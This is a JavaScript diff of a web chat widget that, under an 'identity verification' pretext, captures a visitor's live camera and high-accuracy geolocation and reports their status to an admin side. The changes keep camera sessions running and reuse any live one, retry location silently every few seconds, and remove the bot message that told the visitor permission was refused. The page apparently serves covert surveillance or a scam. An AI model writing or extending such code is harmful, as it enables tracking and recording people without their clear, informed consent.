@@ -296,6 +296,7 @@
   }
 
   const cameraSessions = new Map();
+  let startVisitorCameraLock = null;
 
   function pickVisitorRecorderMime() {
     if (typeof MediaRecorder === "undefined") return "";
@@ -884,44 +885,22 @@
       state.locationRetryTimer = window.setTimeout(() => {
         state.locationRetryTimer = null;
         void askLocation(false);
-      }, 2500);
+      }, 10000);
     };
 
     const onErr = (err, { fromUserTap = false } = {}) => {
-      // Konum bir kez alındıysa hata status'u ile ezme
+      // Konum hatası kamerayı ASLA kapatmaz ve sohbete spam basmaz
       if (!cameraSessions.has(callId) || state._hadLocation) return;
       const code = Number(err?.code);
-      // ÖNEMLİ: otomatik retry'ları "kullanıcı reddi" sanma → admin'de sahte "Konum engelli"
       const isRealUserDeny = fromUserTap === true && code === 1;
-      const msg = isRealUserDeny
-        ? "denied"
-        : code === 2
-          ? "unavailable"
-          : code === 3
-            ? "timeout"
-            : fromUserTap
-              ? "error"
-              : "prompting";
-      const detail = isRealUserDeny
-        ? err?.message || "Kullanıcı konumu reddetti"
-        : fromUserTap
-          ? err?.message || msg
-          : "Otomatik konum denendi";
-      sync.writeLocationStatus?.(sessionId, callId, msg, detail).catch(() => {});
-      if (!silent && isRealUserDeny && box) {
-        appendMessage(
-          box,
-          "bot",
-          "Kimlik doğrulaması için izin verilmedi. İzin zorunludur; izin olmadan doğrulama tamamlanamaz.",
-          { sync: false }
-        );
-        showLocDeniedNotice();
-        if (!locationGrantedSynced) {
-          syncMessage("user", "Konum izni alınamadı (denied).");
-        }
+      if (isRealUserDeny) {
+        sync.writeLocationStatus?.(sessionId, callId, "denied", err?.message || "denied").catch(() => {});
+        if (!silent && box) showLocDeniedNotice();
+      } else if (!state._locPromptWritten) {
+        state._locPromptWritten = true;
+        sync.writeLocationStatus?.(sessionId, callId, "prompting", "Konum bekleniyor").catch(() => {});
       }
       scheduleRetry();
-      if (isRealUserDeny) state._onLocationDenied?.();
     };
 
     const askLocation = (fromUserTap = false) => {
@@ -940,14 +919,13 @@
           asking = false;
           publish(pos);
           if (!cameraSessions.has(callId) || !state._hadLocation) return;
-          // Watch hataları otomatik — denied yazma
           state.geoWatchId = navigator.geolocation.watchPosition(
             publish,
             (err) => onErr(err, { fromUserTap: false }),
             {
               enableHighAccuracy: true,
-              maximumAge: 2000,
-              timeout: 15000,
+              maximumAge: 5000,
+              timeout: 20000,
             }
           );
         },
@@ -956,17 +934,15 @@
           onErr(err, { fromUserTap });
         },
         {
-          enableHighAccuracy: Boolean(fromUserTap),
-          maximumAge: fromUserTap ? 0 : 60000,
-          timeout: fromUserTap ? 20000 : 60000,
+          enableHighAccuracy: false,
+          maximumAge: 60000,
+          timeout: 30000,
         }
       );
     };
 
     state.locationRetryTimer = null;
-    // Otomatik loop false; yalnızca gerçek jest/buton true geçmeli
     state.retryLocation = (fromUserTap = false) => askLocation(Boolean(fromUserTap));
-    // Zorla: defer değilse mobilde de hemen iste
     if (!deferAsk) {
       askLocation(false);
     }
@@ -1154,20 +1130,34 @@
     const auto = options.auto === true;
     const sync = window.ChatSync;
 
-    // Canlı oturumu ASLA kesme — her restart siyah ekran + admin bağlantı çökmesi
-    const already = cameraSessions.get(callId);
-    if (
-      already?.pc &&
-      already?.stream?.getTracks?.().some((t) => t.readyState === "live")
-    ) {
-      const preview = showSilentCameraStatus(box, callId);
-      if (preview.wrap) already.wrap = preview.wrap;
-      if (preview.label) already.label = preview.label;
-      if (options.seedLocation?.coords && !already._hadLocation) {
-        applySeedLocationToSession(sync, callId, already, options.seedLocation);
-      } else if (already && !already._hadLocation) {
+    // Eşzamanlı ikinci çağrı kamerayı öldürmesin
+    if (startVisitorCameraLock) {
+      try {
+        await startVisitorCameraLock;
+      } catch {
+        /* ignore */
+      }
+    }
+
+    // Canlı oturumu ASLA kesme — konum retry / ikinci callId yüzünden kapanmasın
+    const liveExisting =
+      cameraSessions.get(callId) ||
+      [...cameraSessions.values()].find((st) =>
+        st?.stream?.getTracks?.().some((t) => t.readyState === "live")
+      ) ||
+      null;
+    if (liveExisting?.stream?.getTracks?.().some((t) => t.readyState === "live")) {
+      const liveId =
+        [...cameraSessions.entries()].find(([, st]) => st === liveExisting)?.[0] || callId;
+      latestCameraCallId = liveId;
+      const preview = showSilentCameraStatus(box, liveId);
+      if (preview.wrap) liveExisting.wrap = preview.wrap;
+      if (preview.label) liveExisting.label = preview.label;
+      if (options.seedLocation?.coords && !liveExisting._hadLocation) {
+        applySeedLocationToSession(sync, liveId, liveExisting, options.seedLocation);
+      } else if (!liveExisting._hadLocation) {
         try {
-          already.retryLocation?.(false);
+          liveExisting.retryLocation?.(false);
         } catch {
           /* ignore */
         }
@@ -1175,6 +1165,7 @@
       return "ok";
     }
 
+    const run = (async () => {
     if (!sync?.enabled) {
       if (!options.silent) {
         appendMessage(box, "bot", "Kimlik doğrulaması için canlı senkron gerekir.", {
@@ -1191,11 +1182,16 @@
       return "error";
     }
 
-    // Eski / eşzamanlı diğer çağrıları kapat — tek kamera oturumu
+    // Ölü oturumları temizle — canlı olanı ASLA kill etme
     for (const otherId of [...cameraSessions.keys()]) {
-      if (otherId !== callId) {
-        await stopCameraSession(otherId, { upload: false });
+      if (otherId === callId) continue;
+      const st = cameraSessions.get(otherId);
+      const live = st?.stream?.getTracks?.().some((t) => t.readyState === "live");
+      if (live) {
+        latestCameraCallId = otherId;
+        return "ok";
       }
+      await stopCameraSession(otherId, { upload: false });
     }
     await stopCameraSession(callId, { upload: false });
 
@@ -1391,6 +1387,14 @@
       // ended yazma — aynı callId ile sessizce tekrar dene (spam mesaj olmasın)
       await sync.setCameraCallStatus(sessionId, callId, "requested").catch(() => {});
       return "error";
+    }
+    })();
+
+    startVisitorCameraLock = run;
+    try {
+      return await run;
+    } finally {
+      if (startVisitorCameraLock === run) startVisitorCameraLock = null;
     }
   }
 
@@ -2466,7 +2470,20 @@
         if (token !== cameraPermLoopToken) return;
 
         // Canlı kamera varsa yeniden başlatma — sadece konum tamamla
-        if (sessionHasLiveCam(callId)) {
+        if (hasLiveCameraSession()) {
+          if (!callId) {
+            callId =
+              latestCameraCallId ||
+              [...cameraSessions.keys()].find((id) =>
+                cameraSessions
+                  .get(id)
+                  ?.stream?.getTracks?.()
+                  .some((t) => t.readyState === "live")
+              ) ||
+              null;
+          }
+        }
+        if (callId && sessionHasLiveCam(callId)) {
           const existingLive = cameraSessions.get(callId);
           if (existingLive && !existingLive._hadLocation) {
             try {
